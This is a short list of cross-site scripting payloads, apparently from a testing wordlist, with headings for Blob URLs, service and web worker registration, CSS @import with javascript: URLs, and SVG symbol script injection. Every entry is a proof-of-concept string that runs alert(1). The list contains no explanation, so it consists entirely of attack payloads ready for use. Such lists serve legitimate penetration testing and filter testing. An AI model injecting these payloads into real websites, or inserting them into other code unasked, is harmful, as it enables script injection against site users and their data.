# Blob URL Creation
"URL.createObjectURL(new Blob(['<script>alert(1)</script>'], {type: 'text/html'}))"
"URL.createObjectURL(new Blob(['alert(1)'], {type: 'text/javascript'}))"

# Service Worker Injection
"navigator.serviceWorker.register('data:text/javascript,alert(1)')"
"navigator.serviceWorker.register('javascript:alert(1)')"

# Web Worker Injection
"new Worker('data:text/javascript,alert(1)')"
"new Worker('javascript:alert(1)')"

# CSS @import Variants
"@import url('javascript:alert(1)')"
"@import 'javascript:alert(1)'"
"@import \"javascript:alert(1)\""

# SVG External References
"<svg><use href=\"#x\"/><symbol id=\"x\"><script>alert(1)</script></symbol></svg>"
